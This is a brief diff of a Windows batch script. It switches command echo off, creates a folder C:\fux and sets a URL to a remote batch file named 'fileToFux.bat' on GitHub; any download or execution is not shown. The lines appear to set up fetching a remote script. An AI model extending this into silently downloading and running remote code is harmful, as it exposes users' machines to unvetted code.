@@ -1,4 +1,4 @@
-@echo test test
+@echo off
 if not exist "C:\fux" md "C:\fux"
 
 set URL=https://raw.githubusercontent.com/BelliniGauss/1/main/fileToFux.bat
